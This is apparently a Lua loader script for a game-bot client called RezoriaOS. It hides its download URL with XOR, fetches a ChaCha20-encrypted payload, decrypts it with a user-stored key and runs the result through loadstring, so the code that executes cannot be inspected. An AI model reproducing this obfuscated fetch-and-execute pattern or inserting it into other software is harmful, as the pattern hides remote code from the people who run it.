setDefaultTab("OS")

local KEY_STORAGE = "rezoriaOSKey"
local URL_XOR_KEY = 173
local URL_BYTES = {
  197, 217, 217, 221, 222, 151, 130, 130, 223, 204, 218, 131, 202, 196, 217,
  197, 216, 207, 216, 222, 200, 223, 206, 194, 195, 217, 200, 195, 217, 131,
  206, 194, 192, 130, 198, 198, 195, 204, 201, 194, 130, 255, 200, 215, 194,
  223, 196, 204, 242, 238, 225, 130, 192, 204, 196, 195, 130, 221, 204, 212,
  193, 194, 204, 201, 130, 255, 232, 247, 226, 255, 228, 236, 242, 238, 225,
  131, 206, 197, 204, 206, 197, 204, 159, 157, 131, 197, 200, 213
}

local unpack_fn = unpack or table.unpack
local MASK32 = 4294967296

local function log(message)
  print("[RezoriaOS Loader] " .. tostring(message))
end

local function add32(a, b)
  return (a + b) % MASK32
end

local function bxor(a, b)
  local result, bit_value = 0, 1
  a = a % MASK32
  b = b % MASK32
  while a > 0 or b > 0 do
    local abit = a % 2
    local bbit = b % 2
    if abit ~= bbit then
      result = result + bit_value
    end
    a = math.floor(a / 2)
    b = math.floor(b / 2)
    bit_value = bit_value * 2
  end
  return result % MASK32
end

local function rotl32(value, shift)
  local left = (value * (2 ^ shift)) % MASK32
  local right = math.floor(value / (2 ^ (32 - shift)))
  return (left + right) % MASK32
end

local function quarter_round(state, a, b, c, d)
  state[a] = add32(state[a], state[b])
  state[d] = rotl32(bxor(state[d], state[a]), 16)
  state[c] = add32(state[c], state[d])
  state[b] = rotl32(bxor(state[b], state[c]), 12)
  state[a] = add32(state[a], state[b])
  state[d] = rotl32(bxor(state[d], state[a]), 8)
  state[c] = add32(state[c], state[d])
  state[b] = rotl32(bxor(state[b], state[c]), 7)
end

local function word_le(bytes, offset)
  return bytes[offset]
    + bytes[offset + 1] * 256
    + bytes[offset + 2] * 65536
    + bytes[offset + 3] * 16777216
end

local function bytes_from_hex(hex)
  hex = tostring(hex or ""):gsub("%s+", "")
  if #hex % 2 ~= 0 then return nil end
  local bytes = {}
  for i = 1, #hex, 2 do
    local value = tonumber(hex:sub(i, i + 1), 16)
    if not value then return nil end
    bytes[#bytes + 1] = value
  end
  return bytes
end

local function string_from_bytes(bytes)
  local out = {}
  for i = 1, #bytes, 4096 do
    local chunk = {}
    local last = math.min(i + 4095, #bytes)
    for j = i, last do
      chunk[#chunk + 1] = bytes[j]
    end
    out[#out + 1] = string.char(unpack_fn(chunk))
  end
  return table.concat(out)
end

local function url()
  local chars = {}
  for i, value in ipairs(URL_BYTES) do
    chars[i] = string.char(bxor(value, URL_XOR_KEY))
  end
  return table.concat(chars)
end

local function chacha20_block(key, counter, nonce)
  local constants = { string.byte("expand 32-byte k", 1, 16) }
  local state = {
    word_le(constants, 1), word_le(constants, 5), word_le(constants, 9), word_le(constants, 13),
    word_le(key, 1), word_le(key, 5), word_le(key, 9), word_le(key, 13),
    word_le(key, 17), word_le(key, 21), word_le(key, 25), word_le(key, 29),
    counter % MASK32,
    word_le(nonce, 1), word_le(nonce, 5), word_le(nonce, 9)
  }

  local working = {}
  for i = 1, 16 do working[i] = state[i] end

  for _ = 1, 10 do
    quarter_round(working, 1, 5, 9, 13)
    quarter_round(working, 2, 6, 10, 14)
    quarter_round(working, 3, 7, 11, 15)
    quarter_round(working, 4, 8, 12, 16)
    quarter_round(working, 1, 6, 11, 16)
    quarter_round(working, 2, 7, 12, 13)
    quarter_round(working, 3, 8, 9, 14)
    quarter_round(working, 4, 5, 10, 15)
  end

  local block = {}
  for i = 1, 16 do
    local value = add32(working[i], state[i])
    block[#block + 1] = value % 256
    block[#block + 1] = math.floor(value / 256) % 256
    block[#block + 1] = math.floor(value / 65536) % 256
    block[#block + 1] = math.floor(value / 16777216) % 256
  end
  return block
end

local function chacha20_xor(data, key, nonce)
  local out, offset, counter = {}, 1, 1
  while offset <= #data do
    local block = chacha20_block(key, counter, nonce)
    for i = 1, 64 do
      local value = data[offset]
      if value == nil then break end
      out[#out + 1] = bxor(value, block[i])
      offset = offset + 1
    end
    counter = (counter + 1) % MASK32
  end
  return out
end

local function run_payload(payload)
  local nonce_hex, cipher_hex = tostring(payload or ""):match("^RZCL1:([0-9a-fA-F]+):([0-9a-fA-F]+)")
  if not nonce_hex or not cipher_hex then
    log("Bad payload format.")
    return
  end

  local key_hex = tostring(storage[KEY_STORAGE] or ""):gsub("%s+", "")
  if not key_hex:match("^[0-9a-fA-F]+$") or #key_hex ~= 64 then
    log("Missing key. Set storage." .. KEY_STORAGE .. " to the shared 64-char hex key.")
    return
  end

  local key = bytes_from_hex(key_hex)
  local nonce = bytes_from_hex(nonce_hex)
  local cipher = bytes_from_hex(cipher_hex)
  if not key or #key ~= 32 or not nonce or #nonce ~= 12 or not cipher then
    log("Could not decode encrypted payload.")
    return
  end

  local source = string_from_bytes(chacha20_xor(cipher, key, nonce))
  local fn, err = loadstring(source)
  if not fn then
    log("Decrypted payload is not valid Lua: " .. tostring(err))
    return
  end

  fn()
end

local http = modules.corelib.HTTP
http.get(url(), function(body)
  run_payload(body)
end, function()
  log("Could not download payload.")
end)

